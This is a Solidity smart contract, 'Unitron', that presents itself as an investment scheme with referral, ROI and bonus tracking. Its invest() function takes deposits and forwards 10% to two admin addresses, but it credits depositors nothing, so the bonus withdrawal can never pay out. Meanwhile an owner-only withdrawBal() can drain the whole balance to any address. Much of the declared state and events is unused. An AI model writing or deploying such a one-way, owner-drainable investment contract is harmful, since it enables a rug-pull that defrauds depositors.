//SourceUnit: unitronWe.sol

pragma solidity ^0.5.14;

contract Unitron {
  address public owner;
  address payable private distrAddr1;
  address payable private distrAddr2;
  uint public invCurId=0;
  uint public userCurId=0;

  struct User {
    uint id;
    uint pk;
    bool exist;
    address sponsor;
    uint totDirect;
    uint directsBsns;
    uint ttlInvts;
    uint creationTime;
    address[] directs;
    UserBalance uBalance;
    Investment[] usrInvsts;
  }
  
  struct UserBalance {
    uint glbBns;
    uint glbBnsEarned;
    uint drctBnsBal;
    uint drctBnsEarned;
    uint roiBal;
    uint roiEarned;
  }

  struct Investment{
    bool exist;
    uint id;
    uint amount;
    uint creationTime;
    uint amtEarned;
    bool roiFlag;
    address user;
  }

  uint public TOTAL_INVESTMENT = 0;

  mapping (uint => address) public idToAddress;
  mapping (uint => address) public pkToAddress;
  mapping (uint => uint) public plans;
  mapping (address => User) private users;
  
  mapping (uint => uint) public lvlDrcts;
  
  event allBonusWithdraw(address user,uint glb,uint drct, uint roi);
  event roiDistributed(address user,uint amount, uint invid,uint unitRate,uint hrDistAmt);
  event glbBonusDistributed(address user,uint amount,uint totalAmt,uint totalUsrs,uint level,uint dId);
  event directBonusDistributed(address user, uint amount);
  event adminDividentSent(uint amount,address addr1,address addr2);
  event newUserRegister(address user,address sponsor,uint plan);
  event planBought(address user,uint amount);

  function withdrawBal(uint amt,address payable addr) onlyOwner public {
      require(amt<=address(this).balance,"balance is less than withdraw amount");
      addr.transfer(amt);
      
  }
  constructor(address payable comp1,address payable comp2) public {
      distrAddr1 = comp1;
      distrAddr2 = comp2;
      owner = msg.sender;
    }

     //modifier
    modifier onlyOwner(){
        require(msg.sender==owner,"only owner can run this");
        _;
    }
    
    modifier firstExist(){   // for in function
        require(users[msg.sender].exist,"First you have to register");
        _;
    }
    
    function changeDistAddr1(address payable newAddr) public onlyOwner returns(bool){
        distrAddr1 = newAddr;
        return true;
    }
    
    function changeDistAddr2(address payable newAddr) public onlyOwner returns(bool){
        distrAddr2 = newAddr;
        return true;
    }
    
    function invest() payable public returns (bool){
        uint cDistrAmt = msg.value*10/100;
        distrAddr1.transfer(cDistrAmt/2);
        distrAddr2.transfer(cDistrAmt/2);
        emit adminDividentSent(cDistrAmt,distrAddr1,distrAddr2); 
        emit planBought(msg.sender,msg.value);
        return true;
    }

    function withdrawAllBonuses() public firstExist {
        uint glbBns = users[msg.sender].uBalance.glbBns;
        uint drctBns = users[msg.sender].uBalance.drctBnsBal;
        uint roiPyt = users[msg.sender].uBalance.roiBal;
        uint ttlWAmt = glbBns + drctBns + roiPyt;
        
        if(ttlWAmt > 0) {
            users[msg.sender].uBalance.glbBnsEarned += glbBns;
            users[msg.sender].uBalance.glbBns -= glbBns;
            users[msg.sender].uBalance.drctBnsEarned += drctBns;
            users[msg.sender].uBalance.drctBnsBal -= drctBns;
            users[msg.sender].uBalance.roiEarned += roiPyt;
            users[msg.sender].uBalance.roiBal -= roiPyt;
            msg.sender.transfer(ttlWAmt);
            emit allBonusWithdraw(msg.sender,glbBns,drctBns,roiPyt);
        }
    }

}